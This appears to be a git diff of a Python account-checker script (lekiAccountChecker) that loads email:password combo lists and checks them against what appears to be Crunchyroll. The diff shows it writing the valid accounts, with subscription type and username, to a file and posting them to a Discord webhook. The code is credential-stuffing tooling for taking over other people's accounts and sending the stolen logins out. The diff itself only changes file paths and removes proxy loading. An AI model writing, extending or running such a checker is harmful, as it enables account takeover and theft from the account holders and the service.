@@ -13,10 +13,9 @@ blue = Fore.BLUE
 white = Fore.WHITE
 webhookurl = ""
 proxyl = []
-with open("Accounts/lekiAccountChecker/combos.txt", 'r') as combos:
+with open("combos.txt", 'r') as combos:
     combos = combos.read().splitlines()
-with open("Accounts/lekiAccountChecker/proxies.txt", "r") as proxies:
-    proxies = proxies.read().splitlines()
+
 
 print(len(combos))
 sp = ""
@@ -87,7 +86,7 @@ def crunchycheck():
                 subscription = userdata["access_type"]
                 yes = f"[{i}VALID] {email}:{password} | Subscription: {subscription}, Username: {name}, Expires: {expire}"
                 print(yes)
-                with open("Accounts/lekiAccountChecker/valid/valid.txt", "a") as write:
+                with open("valid.txt", "a") as write:
                     write = write.writelines(yes + "\n")
                 webhook = DiscordWebhook(url=webhookurl, content="")
                 embed = DiscordEmbed(
